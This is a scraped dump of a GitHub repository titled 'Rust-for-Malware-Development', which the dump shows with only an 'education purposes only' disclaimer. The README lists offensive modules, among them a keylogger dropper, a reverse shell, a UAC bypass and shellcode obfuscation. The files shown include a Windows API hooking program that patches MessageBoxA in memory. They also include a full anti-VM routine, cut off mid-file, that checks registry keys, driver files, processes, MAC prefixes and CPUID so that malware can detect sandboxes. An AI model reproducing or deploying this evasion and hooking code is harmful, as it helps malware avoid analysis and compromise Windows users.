{
  "metadata": {
    "timestamp": 1736709284232,
    "page": 644,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjY1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "Whitecat18/Rust-for-Malware-Development",
      "stars": 1639,
      "defaultBranch": "main",
      "files": [
        {
          "name": "BSOD",
          "type": "tree",
          "content": null
        },
        {
          "name": "Basics",
          "type": "tree",
          "content": null
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.3408203125,
          "content": "# Please Read docker.md file for more information. \n# By @5mukx\n\nFROM rust:latest\n\nRUN apt update ; apt upgrade -y \nRUN apt install -y g++-mingw-w64-x86-64\n\nRUN rustup target add x86_64-pc-windows-gnu \nRUN rustup toolchain install stable-x86_64-pc-windows-gnu \n\nWORKDIR /app\n\nCMD [\"cargo\", \"build\", \"--target\", \"x86_64-pc-windows-gnu\", \"--release\"]\n"
        },
        {
          "name": "EDRChecker",
          "type": "tree",
          "content": null
        },
        {
          "name": "Early Cascade Injection",
          "type": "tree",
          "content": null
        },
        {
          "name": "Encryption Methods",
          "type": "tree",
          "content": null
        },
        {
          "name": "Enumeration",
          "type": "tree",
          "content": null
        },
        {
          "name": "Exec_Extern",
          "type": "tree",
          "content": null
        },
        {
          "name": "Keyloggers",
          "type": "tree",
          "content": null
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.041015625,
          "content": "MIT License\n\nCopyright (c) 2024 Smukx ♠\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "Malware-Samples",
          "type": "tree",
          "content": null
        },
        {
          "name": "Malware_Tips",
          "type": "tree",
          "content": null
        },
        {
          "name": "MessageBoxes",
          "type": "tree",
          "content": null
        },
        {
          "name": "NtApi",
          "type": "tree",
          "content": null
        },
        {
          "name": "Persistence",
          "type": "tree",
          "content": null
        },
        {
          "name": "Process-Injection",
          "type": "tree",
          "content": null
        },
        {
          "name": "Process",
          "type": "tree",
          "content": null
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.47265625,
          "content": "<div align=\"center\">\n  <img width=\"350px\" src=\"https://user-images.githubusercontent.com/797/46922345-99723480-cfbc-11e8-8f2d-18eec8f18ad5.png\" />\n\n  <a href = \"https://github.com/Whitecat18/Rust-for-Malware-Development.git\" ><h3>Rust for Malware Development</h3></a>\n\n  <b>This repository contains source codes of various techniques used by real-world malware authors, red teamers, threat actors, state-sponsored hacking groups etc. These techniques are well-researched and implemented in Rust.</b>\n  <br>\n  <br>\n    Repository managed by <a href=\"https://twitter.com/5mukx\"> @5mukx</a></i></p>\n  <br>\n  <img src=\"https://img.shields.io/badge/Language-Rust-orange\">\n    <img src=\"https://img.shields.io/badge/OS-Windows-blue\">\n  <img src=\"https://img.shields.io/badge/Maintained-Yes-Green\">\n\n-----------------\n\n</div>\n\n> Note: These are my own research and implementations, derived from the original authors' work. If you discover any errors in these codes, please [contact](https://x.com/5mukx) or contribute to this repository.\n\n## Context\n\n* [Encryption Methods](/Encryption%20Methods): Methods to Encrypt and Execute Payloads.\n* [Process Injection](Process-Injection): Process Injection Techniques using Rust.\n* [Malware Samples](Malware-Samples): Written malwares based on Real world activities.\n* [Early Cascade Injection](Early%20Cascade%20Injection): Early Cascade Injection POC written in Rust.\n* [Enumeration](Enumeration): Enumeration Modules to save your time.\n* [Keyloggers](Keyloggers): My implementations of keyloggers using Rust.\n* [Keylogger Dropper](keylog_dropper): Downloads keylogger and sender on victim PC and exectutes in background.\n* [DLL Injection](dll_injection): DLL injection in Rust.\n* [Code Snippet](Malware_Tips): Helps to perform certain malware operations.\n* [NTAPI Implementation](NtApi): Code snippet of using ntapi.\n* [Extract Wifi Passwords](Recon/extract_wifi): Extract Windows Stored Wifi Passwords.  \n* [Reverse Shell Rust](Reverse%20Shell): Rust Client Server Reverse Shell.\n* [RegShell](RegShell): Store and Execute shellcode in Registry.\n* [Thread Hijacking](Threads): Thread Hijacking code Snippet.\n* [Shellcode Obfuscation](obfuscation): Obfuscate and deobfuscate shellcode using Ipv4, Ipv6, MAC, UUiD formats.\n* [Self Delete](./Self-Deletion-Techniques/): Techniques to Self Delete an running binary file. \n* [Position Independent Series](position%20independent): Position independent series in Rust.\n* [Shellcode Execution methods](shellcode_exec): Shellcode execution methods using WinApi's.\n* [API Hammering](api_hammering): API Hammering techniques.\n* [Sleep Obfuscation](Sleep_Obfuscations/Ekko): Sleep Obfuscation implementation in Rust.\n* [Syscalls](syscalls/): Syscall Implementation using system call STUB [Direct/Indirect] methods.\n* [BSOD](BSOD): Causes BSOD when Executing. \n* [Persistence](Persistence): Persistence Code Snippet.\n* [UAC Bypass CMSTP](uac-bypass-cmstp/): Bypass UAC by elevating CMSTP.exe\n* [Process Injection 2](Process): Process Injection Code Snippet 2.\n* [Malware DSA](shellcode_exec/DSA_Exec): Implementing malwares using DSA (Data Structures and Algorithms) Concept.\n* [EDR Checker](EDRChecker): check for the presence of EDR's tools, AV softwares, and other security-related applications on a Windows system.\n\n## Manifest dependencies for [winapi](https://docs.rs/winapi/latest/winapi/) to test and execute\n\n**Copy the dependencics in Cargo.toml file**\n\n```\n[dependencies]\nwinapi = { version = \"0.3.9\", features = [\"winuser\",\"setupapi\",\"dbghelp\",\"wlanapi\",\"winnls\",\"wincon\",\"fileapi\",\"sysinfoapi\", \"fibersapi\",\"debugapi\",\"winerror\", \"wininet\" , \"winhttp\" ,\"synchapi\",\"securitybaseapi\",\"wincrypt\",\"psapi\", \"tlhelp32\", \"heapapi\",\"shellapi\", \"memoryapi\", \"processthreadsapi\", \"errhandlingapi\", \"winbase\", \"handleapi\", \"synchapi\"] }\nntapi = \"0.4.1\"\n```\n\n> Tips for Rust Beginners: Copy and save the dependencies in Cargo.toml File. Versions may be different. Just copy the features when testing. \n\n* **How to Compile this Repository Source Codes [README.](./deps.md)**\n* **Cross Compilation Using Docker [README.](./docker.md).** \n\n## Rust Malware Blogs regarding this Repostitory\n\n* [Malware Development Essentials Part 1](https://medium.com/system-weakness/malware-development-essentials-part-1-5f4626652ed9)\n\n* [Rust for CyberSecurity and Red Teaming](https://infosecwriteups.com/rust-for-cyber-security-and-red-teaming-275595d3fdec)\n\n* [DLL Injection using Rust](https://smukx.medium.com/dll-injection-using-rust-593b83734c90)\n\n⚠️ These Resources are only for Education Purposes Only ⚠️\n"
        },
        {
          "name": "Recon",
          "type": "tree",
          "content": null
        },
        {
          "name": "RegShell",
          "type": "tree",
          "content": null
        },
        {
          "name": "Reverse Shell",
          "type": "tree",
          "content": null
        },
        {
          "name": "Self-Deletion-Techniques",
          "type": "tree",
          "content": null
        },
        {
          "name": "Sleep_Obfuscations",
          "type": "tree",
          "content": null
        },
        {
          "name": "Test_phase",
          "type": "tree",
          "content": null
        },
        {
          "name": "Threads",
          "type": "tree",
          "content": null
        },
        {
          "name": "Windows_Threads",
          "type": "tree",
          "content": null
        },
        {
          "name": "analysis",
          "type": "tree",
          "content": null
        },
        {
          "name": "api_hammering",
          "type": "tree",
          "content": null
        },
        {
          "name": "api_hooking.rs",
          "type": "blob",
          "size": 3.5849609375,
          "content": "/*\n    Windows API Hooking\n    For more Codes: https://github.com/Whitecat18/Rust-for-Malware-Development.git\n    Resources used: https://www.ired.team/offensive-security/code-injection-process-injection/how-to-hook-windows-api-using-c++\n                    https://forums.codeguru.com/showthread.php?468963-sample-source-MessageBox-API-Hook&p=1806470#post1806470\n    @5mukx\n*/\n\nuse std::ptr::null_mut;\nuse user32::MessageBoxA;\nuse winapi::ctypes::c_void;\nuse winapi::shared::minwindef::UINT;\nuse winapi::shared::ntdef::{LPCSTR, LPSTR};\nuse winapi::shared::windef::HWND;\nuse winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};\nuse winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};\nuse winapi::um::processthreadsapi::GetCurrentProcess;\nuse std::ffi::{CStr, CString};\nuse std::ptr::addr_of_mut;\n\ntype FarProc = *mut c_void;\ntype SizeT = usize;\n\nstatic mut MESSAGE_BOX_ADDRESS: FarProc = null_mut();\nstatic mut MESSAGE_BOX_ORIGINAL_BYTES: [u8; 6] = [0; 6];\nstatic mut BYTES_WRITTEN: SizeT = 0;\n\nunsafe extern \"system\" fn hooked_message_box(\n    hwnd: HWND,\n    lp_text: LPSTR,\n    lp_caption: LPCSTR,\n    u_type: UINT,\n) -> i32 {\n    let text = CStr::from_ptr(lp_text).to_str().unwrap_or(\"INVALID UTF-8\");\n    let caption = CStr::from_ptr(lp_caption).to_str().unwrap_or(\"INVALID UTF-8\");\n    println!(\"Nerdy from Hooded Function\");\n    println!(\"Text : {}\",text);\n    println!(\"Caption: {}\",caption);\n\n    WriteProcessMemory(\n        hwnd as *mut c_void,\n        MESSAGE_BOX_ADDRESS as *mut _,\n        MESSAGE_BOX_ORIGINAL_BYTES.as_ptr() as *const _,\n        MESSAGE_BOX_ORIGINAL_BYTES.len(),\n        addr_of_mut!(BYTES_WRITTEN),\n    );\n\n    MessageBoxA(hwnd as _, \n        lp_text, \n        lp_caption, \n        u_type\n    )\n}\n\nfn main(){\n    let box_title = CString::new(\"NerdyX...\").expect(\"error\");\n    let message = CString::new(\"Hello Nerds. Lets Hook some API's\").expect(\"error\");\n\n    unsafe{\n        MessageBoxA(\n            null_mut(),\n            message.as_ptr() as LPCSTR,\n            box_title.as_ptr() as LPCSTR, // *const CHAR\n            0x00000000, // MB_OK\n        );\n\n        let library = LoadLibraryA(\"user32.dll\\0\".as_ptr() as *const i8);\n        let mut bytes_read: SizeT = 0;\n\n        MESSAGE_BOX_ADDRESS = GetProcAddress(library, \"MessageBoxA\\0\".as_ptr() as *const i8) as FarProc;\n\n        ReadProcessMemory(\n            GetCurrentProcess(),\n            MESSAGE_BOX_ADDRESS,\n            MESSAGE_BOX_ORIGINAL_BYTES.as_mut_ptr() as *mut _,\n            MESSAGE_BOX_ORIGINAL_BYTES.len(),\n            &mut bytes_read,\n        );\n\n        let hook_text = CString::new(\"Nerdys.. im from Hook func\").expect(\"error\");\n        let hook_heading = CString::new(\"Hooked\").expect(\"error\");\n        \n        let hook_msg_box_addr: FarProc = hooked_message_box(\n            null_mut(),\n            hook_text.as_ptr() as _,\n            hook_heading.as_ptr() as _,\n            0x00000000,\n        ) as *mut c_void;\n\n        let patch: [u8; 6] = [0x68, 0, 0, 0, 0, 0xC3];\n        *(patch.as_ptr().offset(1) as *mut FarProc) = hook_msg_box_addr;\n\n        WriteProcessMemory(\n            GetCurrentProcess(),            \n            MESSAGE_BOX_ADDRESS as *mut _,\n            patch.as_ptr() as *const _,\n            patch.len(),\n            addr_of_mut!(BYTES_WRITTEN),\n        );\n\n        let after_hook_title = CString::new(\"After Hooked\").expect(\"error\");\n        let after_hook_text = CString::new(\"Nerdies .. This is after Hooked\").expect(\"error\"); \n        \n        MessageBoxA(\n            null_mut(),\n            after_hook_text.as_ptr() as LPCSTR,\n            after_hook_title.as_ptr() as LPCSTR,\n            0x00000000,\n        );\n    }\n}\n"
        },
        {
          "name": "deps.md",
          "type": "blob",
          "size": 1.1923828125,
          "content": "\n## How to Compile the Repository source code.\n\nMake sure you have rust installed. [Click here](https://www.rust-lang.org/tools/install) to install Rust \n\n\nStep 1: Create an new package\n\ncargo new [name]\n\n\n<div align=\"center\"> <img src=\"./images/new_cargo_package.png\" alt=\"cargo-package\" width=\"50%\"> </div>\n\n<br>\n\n```\ncargo new maldev\n```\n\n\nImport the code you want to execute or build it.\n\n<div align=\"center\"> <img src=\"./images/import_code.png\" alt=\"import_code\" width=\"50%\"> </div>\n\n<br>\nBefore that, make sure you have imported the winapi package.\n\n<br>\n<div align=\"center\"> <img src=\"./images/dependencics.png\" alt=\"deps_code\" width=\"50%\"> </div>\n\n<br>\n[COPY IT]\n\n<br>\n\n<div align=\"center\"> <img src=\"./images/copy_deps.png\" alt=\"deps_copy\" width=\"50%\"> </div>\n\n<br>\n\nBuild the project!\n\n<br>\n<div align=\"center\"> <img src=\"./images/cargo_build.png\" alt=\"build_project\" width=\"50%\"> </div>\n\n<br>\nYou can see the build file in the Target -> Release path.\n\n<br>\n\n<div align=\"center\"> <img src=\"./images/file_path.png\" alt=\"build_path\" width=\"50%\"> </div>\n\n<br>\n\nFinally, executing it. Running the calc.exe shellcode!\n\n<br>\n\n<div align=\"center\"> <img src=\"./images/exec.png\" alt=\"exec_path\" width=\"50%\"> </div>\n\n<br>"
        },
        {
          "name": "dll_injection",
          "type": "tree",
          "content": null
        },
        {
          "name": "docker.md",
          "type": "blob",
          "size": 2.1875,
          "content": "# Cross Compile Rust-Programs using Docker\n\n## Prerequisites\n\n* Docker\n\n## Steps\n\nI have created an Dockerfile in my main branch of [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development.git). lets build our image\n\n\n```\ndocker build . -t windows_compile \n```\n\n> ⚠️ : This build takes upto 3 GB Space\n\nNext run the container in the following project Directory ! \n\nOnce you’ve created the image, then you can run the container by executing the following command:\n\n```\ndocker run --rm -v ‘your-pwd’:/app rust_cross_compile/windows\n```\n\nThe -rm option will remove the container when the command completes. The -v command allows you to persist data after a container has existed by linking your container storage with your local machine. Replace ‘your-pwd’ with the absolute path to your Rust directory\n\nExample i have compiled [EDRChecker](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/EDRChecker) and executed on my Virtual Machine. \n\n![image](https://github.com/user-attachments/assets/f36dd530-9da8-4e64-9180-078af6bfb37c)\n\n![image](https://github.com/user-attachments/assets/57272c70-de5c-4435-acc8-7899c1ea7a7a)\n\n\n## Modifying Dockerfile \n\nHere is the Default version of Rust Container\n```\nFROM rust:latest\n\nRUN apt update ; apt upgrade -y \nRUN apt install -y g++-mingw-w64-x86-64\n\nRUN rustup target add x86_64-pc-windows-gnu \nRUN rustup toolchain install stable-x86_64-pc-windows-gnu \n\nWORKDIR /app\n\nCMD [\"cargo\", \"build\", \"--target\", \"x86_64-pc-windows-gnu\"]\n```\n\nFor **--release** you can modify the Dockerfile as Follows \n\n```\nFROM rust:latest\n\nRUN apt update ; apt upgrade -y \nRUN apt install -y g++-mingw-w64-x86-64\n\nRUN rustup target add x86_64-pc-windows-gnu \nRUN rustup toolchain install stable-x86_64-pc-windows-gnu \n\nWORKDIR /app\n\nCMD [\"cargo\", \"build\", \"--target\", \"x86_64-pc-windows-gnu\", \"--release\"]\n```\n\nHere is the Image: \n\n![image](https://github.com/user-attachments/assets/b1220909-c0c8-4645-b7a2-94acb5722bf6)\n\n![image](https://github.com/user-attachments/assets/35efd900-2f61-4c7d-89d2-815ec318639e)\n\nTHE PATH WHERE IT COMPILES AND KEEPS BINARY FILES: \n\n![image](https://github.com/user-attachments/assets/66fc1c4f-6759-413d-a417-3609d5bd14c2)\n\n"
        },
        {
          "name": "drivers",
          "type": "tree",
          "content": null
        },
        {
          "name": "evade_vm.rs",
          "type": "blob",
          "size": 12.556640625,
          "content": "/*\n    Anti-Virtualization / Full-System Emulation \n    For More Malware POC: https://github.com/Whitecat18/Rust-for-Malware-Development.git\n    Resources Used: https://github.com/LordNoteworthy/al-khaser\n    By @5mukx\n*/\n\n\n/*\n\nNote: \n    [Dev Machine] -> Installed VM's Softwares and some development tools for malware testing. \n    I have comment out some code due to testing purpose. If you execute this code on development machines[Dev Machine] , ofcouse its gonna result out \n    {Machine Running in Vitrualmachine}. So to avoid testing, i have commented out some codes with // sus // tag.\n\n    If you are executing this on normal machines such as schools and office computers, means you can uncomment codes that was tagged with -> // sus //\n\n    [+] This is an All in one resource gathered together and coded..\n            If you want to exec even more fast 1.1 to 0.2 secs.\n                Reduce the content of the program or artifacts and keep up the main one for \n*/\n\n\nuse std::process::Command;\nuse std::fs;\nuse raw_cpuid::CpuId;\n\nmacro_rules! okey {\n    ($msg:expr) => {\n        \n        println!(\"\\n----[+]\\\\  {}  //[+]----\\n\",format!($msg));\n    }\n}\n\nmacro_rules! error {\n    ($msg:expr) => {\n        println!(\"\\n----[-]\\\\  {}  //[-]----\\n\\n\", format!($msg));\n    }\n}\n\nfn main(){\n    let vm_detect = check_vm();\n    if vm_detect{\n        error!(\"VM Detected. Malware Running in sandbox\"); // bruh... ;(\n    }else{\n        okey!(\"Malware Runnung on main Machine\"); // Yayy .. ;)\n    }\n}\n\nfn check_vm() -> bool{\n    \n    //##=> Registry key value artifacts\n\n    let registry_keys_value_artifacts = vec![\n        // (r#\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\"#, \"\",\"\"), // Example test case to see if this reg key attri wokrs ! Dont uncomment this !\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"VMWARE\"),\n        (r#\"HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\"#, \"\", \"\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\SystemBiosVersion\"#, \"\", \"VMWARE\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\SystemBiosVersion\"#, \"\", \"VBOX\"),\n        (r#\"HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\"#, \"\", \"\"),\n        (r#\"HKLM\\HARDWARE\\ACPI\\DSDT\\VBOX__\"#, \"\", \"\"),\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"VBOX\"),\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"QEMU\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\SystemBiosVersion\"#, \"\", \"VBOX\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\SystemBiosVersion\"#, \"\", \"QEMU\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\VideoBiosVersion\"#, \"\", \"VIRTUALBOX\"),\n        (r#\"HKLM\\HARDWARE\\Description\\System\\SystemBiosDate\"#, \"\", \"06/23/99\"),\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"VMWARE\"),\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"VMWARE\"),\n        (r#\"HKLM\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\"#, \"Identifier\", \"VMWARE\"),\n        (r#\"HKLM\\SYSTEM\\ControlSet001\\Control\\SystemInformation\"#, \"SystemManufacturer\", \"VMWARE\"),\n        (r#\"HKLM\\SYSTEM\\ControlSet001\\Control\\SystemInformation\"#, \"SystemProductName\", \"VMWARE\"),\n    ];\n\n    let registry_keys_value_artifacts_value = registry_keys_value_artifacts.iter().any(|&(key, value_name, expected_value)| {\n        let key_exists = registry_key_exists(key);\n        let value_matches = registry_value_matches(key, value_name, expected_value);\n        key_exists && value_matches\n    });\n\n    //##==> Registry Keys artifacts\n\n    let registry_keys_artifacts = vec![\n        r#\"HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\DSDT\\VBOX__\"#,\n        r#\"HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\FADT\\VBOX__\"#,\n        r#\"HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\RSDT\\VBOX__\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxGuest\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxMouse\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxService\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxSF\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\VBoxVideo\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Wine\"#,\n        r#\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters\"#,\n\n        //  // Main machines contains this reg key. So uncomment this !\n        // If you are exec it on developer machine means ofcourse the reg contains in it ..  \n\n        // r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\"#, // sus //\n        // r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\IDE\"#, // sus //\n        // r#\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\SCSI\"#, // sus //\n    ];\n\n    let registry_keys_artifacts_value = registry_keys_artifacts.iter().any(|&key| registry_key_exists(key));\n\n    //##==> Checking File System artifacts !\n    \n    let file_system_artifacts = vec![\n       r#\"C:\\Windows\\system32\\drivers\\VBoxMouse.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\VBoxGuest.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\VBoxSF.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\VBoxVideo.sys\"#,\n       r#\"C:\\Windows\\system32\\vboxdisp.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxhook.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxmrxnp.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxogl.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglarrayspu.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglcrutil.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglerrorspu.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglfeedbackspu.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglpackspu.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxoglpassthroughspu.dll\"#,\n       r#\"C:\\Windows\\system32\\vboxservice.exe\"#,\n       r#\"C:\\Windows\\system32\\vboxtray.exe\"#,\n       r#\"C:\\Windows\\system32\\VBoxControl.exe\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmmouse.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmhgfs.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vm3dmp.sys\"#, \n       r#\"C:\\Windows\\system32\\drivers\\vmhgfs.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmmemctl.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmmouse.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmrawdsk.sys\"#,\n       r#\"C:\\Windows\\system32\\drivers\\vmusbmouse.sys\"#,\n\n    //  wtf is this -> VMCI.sys is the driver for the VMware Virtual Machine Communication Interface (VMCI). \n    //  It's responsible for communication between the host operating system and a virtual machine, \n    //  or between two or more virtual machines on the same host\n\n    // So if you are testing with your development machine (vmware installed). This file artifact will contains in the main machine so i commented out it !\n    // IF you did not installed vm's on you dev machine, then you can uncomment this !  \n\n       // r#\"C:\\Windows\\system32\\drivers\\vmci.sys\"#, // sus //\n    ];\n    \n    let file_system_artifacts_value = file_system_artifacts.iter().any(|&path| file_artifacts(path));\n\n    //##=> Check running process !\n\n    // Fastest Approach ever 0.3 secs\n\n    let all_processes = get_running_processes();\n    let target_processes = vec![\n        \"vboxservice.exe\",\n        \"vboxtray.exe\",\n        \"vmtoolsd.exe\",\n        \"vmwaretray.exe\",\n        \"vmwareuser.exe\",\n        \"VGAuthService.exe\",\n        \"vmacthlp.exe\",\n        \"vmsrvc.exe\",\n        \"vmusrvc.exe\",\n        \"prl_cc.exe\",\n        \"prl_tools.exe\",\n        \"xenservice.exe\",\n        \"qemu-ga.exe\",\n    ];\n\n    let target_process_value = target_processes.iter()\n        .any(|target_process| process_exists(&all_processes, target_process)); \n\n    \n\n    //##==> Check Mac Address...!\n\n    // let mac_address = get_mac_address();\n\n    let mac_address = match get_mac_address(){\n        Some(mac) => mac,\n        None => return false,\n    };\n\n    let vm_mac_addresses = vec![\n        vec![0x08, 0x00, 0x27], // VBOX\n        vec![0x00, 0x05, 0x69], // VMWARE\n        vec![0x00, 0x0C, 0x29], // VMWARE\n        vec![0x00, 0x1C, 0x14], // VMWARE\n        vec![0x00, 0x50, 0x56], // VMWARE\n        vec![0x00, 0x1C, 0x42], // Parallels\n        vec![0x00, 0x16, 0x3E], // Xen\n        vec![0x0A, 0x00, 0x27], // Hybrid Analysis\n    ]; \n\n    let mac_address_value = match find_matching_pattern(&mac_address, &vm_mac_addresses) {\n        Some(_) => true,  \n        None => false,   \n    };\n\n    //##==> Check CPU Instructions \n\n    let cpuid = CpuId::new();\n    \n    let vm_presence = cpuid.get_feature_info().map_or(false, |info| {\n        info.has_hypervisor()\n    });\n\n\n    let vm_vendor = cpuid.get_vendor_info().map_or(false, |info| {\n        info.as_str().contains(\"KVMKVMKVM\")    || // KVM\n        info.as_str().contains(\"Microsoft Hv\") || // Microsoft Hyper-V or Windows Virtual PC\n        info.as_str().contains(\"VMwareVMware\") || // VMware\n        info.as_str().contains(\"XenVMMXenVMM\") || // Xen\n        info.as_str().contains(\"prl hyperv\")   || // Parallels\n        info.as_str().contains(\"VBoxVBoxVBox\")    // VirtualBox\n    });\n\n    let cpu_vendor_value = vm_presence || vm_vendor;\n\n    //##=> WMI Quaries !! Soon ...!\n\n    registry_keys_value_artifacts_value ||\n    registry_keys_artifacts_value || \n    file_system_artifacts_value ||\n    target_process_value || \n    mac_address_value || \n    cpu_vendor_value\n\n\n}\n\nfn registry_key_exists(key: &str) -> bool {\n    let output = Command::new(\"reg\")\n        .args(&[\"query\", &key])\n        .output()\n        .expect(\"Failed to execute reg query cmd\");\n\n    output.status.success()\n}\n\n// Program to check registry keys with artifacts ..!\nfn registry_value_matches(key: &str, value_name: &str, expected_value: &str) -> bool {\n    let output = Command::new(\"reg\")\n        .args(&[\"query\", &key, \"/v\", value_name])\n        .output()\n        .expect(\"Failed to execute reg query cmd\");\n\n    if output.status.success() {\n        let stdout = String::from_utf8_lossy(&output.stdout);\n        stdout.contains(expected_value)\n    } else {\n        false\n    }\n}\n\n// Progran to check if file exists ! \nfn file_artifacts(path: &str)-> bool{\n    fs::metadata(path).is_ok()\n}\n\n// Programs to check for current running process !\n\nfn get_running_processes() -> Vec<String>{\n    let output = Command::new(\"wmic\")\n        .args(&[\"process\",\"get\",\"name\"])\n        .output()\n        .expect(\"Failed to execute wmic cmd\");\n\n    let output_str = String::from_utf8_lossy(&output.stdout);\n\n    let processes: Vec<String> = output_str\n        .lines()\n        .skip(1)\n        .map(|line| line.trim().to_lowercase())\n        .collect();\n\n    processes\n}\n\nfn process_exists(processes: &[String], target: &str) -> bool {\n    processes.iter().any(|process| process.contains(target))\n}\n\n// Function to find mac addresses\n\nfn get_mac_address() -> Option<Vec<u8>> {\n    let output = Command::new(\"ipconfig\")\n        .args(&[\"/all\"])\n        .output()\n        .expect(\"Failed to Exec ipconfing\");\n\n    let output_str = String::from_utf8_lossy(&output.stdout);\n\n    for line in output_str.lines() {\n        if line.contains(\"Physical Address\") {\n            let parts: Vec<&str> = line.split_whitespace().collect();\n            if parts.len() >= 3 {\n                let mac_address_str = parts[2].replace(\"-\", \":\");\n                let mac_bytes: Vec<u8> = mac_address_str.split(\":\")\n                    .map(|s| u8::from_str_radix(s, 16).unwrap_or_default())\n                    .collect();\n                return Some(mac_bytes);\n            }\n        }\n    }\n    None\n}\n\nfn find_matching_pattern<'a>(mac_address: &'a Vec<u8>, patterns: &'a Vec<Vec<u8>>) -> Option<&'a Vec<u8>> {\n    for pattern in patterns {\n        if mac_address.starts_with(pattern) {\n            return Some(pattern);\n        }\n    }\n    None\n}\n\n\n// Programs to find thr presence of Specific CPU Instructions !\n// There is an create that will take care of it !!\n// fn check_cpu_instruction(eax_value: u32) -> bool {\n//     let eax_value_str = format!(\"{:#x}\", eax_value);\n//     let output = Command::new(\"cpuid\")\n//         .args(&[\"-l\", &eax_value_str])\n//         .output()\n//         .expect(\"Failed to execute cpuid cmd\");\n\n//     let output_str = String::from_utf8_lossy(&output.stdout);\n//     output_str.contains(&eax_value_str)\n// }\n\n// fn detect_vendor_string(vendor_string: &str) -> bool {\n//     let output = Command::new(\"cpuid\")\n//         .args(&[\"-s\", \"0\"])\n//         .output()\n//         .expect(\"Failed to execute 